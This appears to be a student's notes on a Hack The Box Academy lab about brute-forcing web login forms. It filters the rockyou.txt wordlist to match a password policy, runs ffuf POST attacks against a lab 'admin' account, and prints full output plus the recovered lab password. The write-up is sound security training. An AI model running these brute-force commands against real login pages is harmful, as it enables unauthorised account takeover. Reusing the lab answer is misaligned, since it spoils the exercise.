After successfully identifying valid users, password-based authentication relies on the password as a sole measure for authenticating the user. Since users tend to select an easy-to-remember password, attackers may be able to guess or brute-force it.

While password brute-forcing is not the focus of this module (it is covered in more detail in other modules referenced at the end of this section), we will still discuss an example of brute-forcing a password-based login form, as it is one of the most common examples of broken authentication.

---

## Brute-Forcing Passwords

Passwords remain one of the most common online authentication methods, yet they are plagued with many issues. One prominent issue is password reuse, where individuals use the same password across multiple accounts. This practice poses a significant security risk because if one account is compromised, attackers can potentially gain access to other accounts with the same credentials. This enables an attacker who obtained a list of passwords from a password leak to try the same passwords on other web applications ("Password Spraying"). Another issue is weak passwords based on typical phrases, dictionary words, or simple patterns. These passwords are vulnerable to brute-force attacks, where automated tools systematically try different combinations until they find the correct one, compromising the account's security.

When accessing the sample web application, we can see the following information on the login page:

 ![](https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_1.png)

The success of a brute-force attack entirely depends on the number of attempts an attacker can perform and the amount of time the attack takes. As such, ensuring that a good wordlist is used for the attack is crucial. If a web application enforces a password policy, we should ensure that our wordlist only contains passwords that match the implemented password policy. Otherwise, we are wasting valuable time with passwords that users cannot use on the web application, as the password policy does not allow them.

For instance, the popular password wordlist`rockyou.txt` contains more than 14 million passwords:


```shell-session
smoothment@htb[/htb]$ wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

14344391 /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Now, we can use`grep` to match only those passwords that match the password policy implemented by our target web application, which brings down the wordlist to about 150,000 passwords, a reduction of about 99%:

```shell-session
smoothment@htb[/htb]$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

smoothment@htb[/htb]$ wc -l custom_wordlist.txt

151647 custom_wordlist.txt
```

To start brute-forcing passwords, we need a user or a list of users to target. Using the techniques covered in the previous section, we determine that admin is a username for a valid user, therefore, we will attempt brute-forcing its password.

However, first, let us intercept the login request to know the names of the POST parameters and the error message returned within the response:

![image](https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_2.png)

Upon providing an incorrect username, the login response contains the message (substring) "Invalid username", therefore, we can use this information to build our`ffuf` command to brute-force the user's password:


```shell-session
smoothment@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4764ms]
 * FUZZ: Buttercup1
```

After some time, we can successfully obtain the admin user's password, enabling us to log in to the web application:

 ![](https://academy.hackthebox.com/storage/modules/269/bf/pw_bf_3.png)

For more details on creating custom wordlists and attacking password-based authentication, check out the [Cracking Passwords with Hashcat](https://academy.hackthebox.com/module/details/20) and [Password Attacks](https://academy.hackthebox.com/module/details/147) modules. Further details on brute-forcing different variations of web application logins are provided in the [Login Brute Forcing](https://academy.hackthebox.com/module/details/57) module.

# Question
---

![Pasted image 20250214145506.png](../../../../IMAGES/Pasted%20image%2020250214145506.png)

Let's begin by visiting the website:

![Pasted image 20250214145956.png](../../../../IMAGES/Pasted%20image%2020250214145956.png)

We can see the password policy on top of the web application, it goes the following way:

```ad-info
A password must contain:

- at least one upper-case character
- at least one lower-case character
- at least one digit
- minimum length of 10 characters

```

We can use `rockyou.txt` wordlist, but we need to filter it out a bit, let's use the following command:

```
grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

Let's breakdown the grep command:

```ad-important
#### Breakdown
---
### 1.`grep '[[:upper:]]'`

- **Function**: Filters lines with at least **one uppercase letter** (`A-Z`).
 
- **POSIX Class**:`[[:upper:]]` is a portable way to match uppercase letters across different locales.
 
- **Result**: Passwords without uppercase letters are discarded.
 

---

### 2.`grep '[[:lower:]]'`

- **Function**: From the remaining lines, keep those with **one lowercase letter** (`a-z`).
 
- **Result**: Passwords missing lowercase letters are now removed.
 

---

### 3.`grep '[[:digit:]]'`

- **Function**: From the remaining lines, keep those with **at least one digit** (`0-9`).
 
- **Result**: Passwords without numbers are filtered out.
 

---

### 4.`grep -E '.{10}'`

- **Function**: Uses extended regex (`-E`) to enforce a **minimum length of 10 characters**.
 
- **Regex**:`.` matches any character, and`{10}` requires 10 occurrences.
 
 - `.` = any character
 
 - `{10}` = exactly 10 times (but since there's no upper limit, it matches 10+ characters).
 
- **Caveat**: This checks if the password **contains** 10 characters anywhere in the line, not necessarily the entire line.
 
 - **Fix**: Use`^.{10,}$` to ensure the **entire password** is â‰¥10 characters.
 

---

### Key Notes:

1. **Order Matters**: 
 The pipeline processes filters sequentially. If a password fails any condition, it gets dropped early, improving efficiency.
 
2. **POSIX vs Simple Regex**: 
 `[[:upper:]]` is more reliable than`[A-Z]` because it handles non-English characters and locale settings.
 
3. **Length Check Issue**: 
 The command`.{10}` may allow passwords longer than 10 characters but doesn't explicitly enforce a **minimum** length for the entire password.
 
 - **Better Practice**: Replace with`grep -E '^.{10,}$'` to ensure the entire line (password) is â‰¥10 characters.
```

Now, we can use ffuf:

```
ffuf -w custom_wordlist.txt -u http://IP:PORT/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username" -ic -c -t 200
```

We get the following output:

```
ffuf -w custom_wordlist.txt -u http://94.237.55.96:36280/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : POST
 :: URL : http://94.237.55.96:36280/index.php
 :: Wordlist : FUZZ: /home/samsepiol/custom_wordlist.txt
 :: Header : Content-Type: application/x-www-form-urlencoded
 :: Data : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Regexp: Invalid username
________________________________________________

Ramirez120992 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 306ms]
```

Password is:

```
Ramirez120992
```

### Alternative filtering
---


We can do the following wordlist filter too:

```bash
grep -P '^(?=.*[A-Z])(?=.*[a-z])(?=.*\d).{10,}$' /usr/share/wordlists/rockyou.txt > filtered_rockyou.txt
```

```ad-important
#### Breakdown
---
(GNU grep with`-P`):

- `-P`: Enables Perl-Compatible Regular Expressions (PCRE).
 
- `(?=.*[A-Z])`: Lookahead for at least one uppercase character.
 
- `(?=.*[a-z])`: Lookahead for at least one lowercase character.
 
- `(?=.*\d)`: Lookahead for at least one digit.
 
- `.{10,}`: Ensures a minimum length of 10 characters.

```

And we'll get the same output:

```
ffuf -w filtered_rockyou.txt -u http://94.237.55.96:36280/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : POST
 :: URL : http://94.237.55.96:36280/index.php
 :: Wordlist : FUZZ: /home/samsepiol/filtered_rockyou.txt
 :: Header : Content-Type: application/x-www-form-urlencoded
 :: Data : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Regexp: Invalid username
________________________________________________

Ramirez120992 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
```

